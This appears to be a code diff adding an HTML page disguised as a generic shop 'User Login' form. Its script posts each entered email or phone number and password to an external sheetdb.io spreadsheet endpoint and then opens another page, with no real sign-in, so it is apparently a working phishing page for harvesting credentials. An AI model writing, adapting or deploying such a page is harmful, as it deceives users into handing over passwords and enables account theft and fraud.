@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lamg="en">
+<head>
+    <link rel="icon" href="download.png">
+    <title>User Login</title>
+    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    </head>
+
+<body>
+    <center>
+        <form action="https://sheetdb.io/api/v1/09p9rg78kkolb" mathod="post" id="sheetdb-form">
+<div class="main-div">
+    <img src="shop.png" alt="image">
+    <h3>User Login</h3>
+    <input class="email"type="email" placeholder="Useremail or Phone" name="data[email]">
+    <input  class="Pass"type="password" placeholder="Password" name="data[psw]">
+  <br>
+    <input class="checkbox" type="checkbox">
+    <p>Remember Me</p>
+    <br>
+    <span>Forget Password?</span>
+    <br>
+    <input class="submit" type="submit" value="Log In">
+    
+    </div>
+   </form>
+  
+    </center>
+   <script>
+var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('page2.html', '_blank');
+          });
+        });
+</script>
+    </body>
+</html>
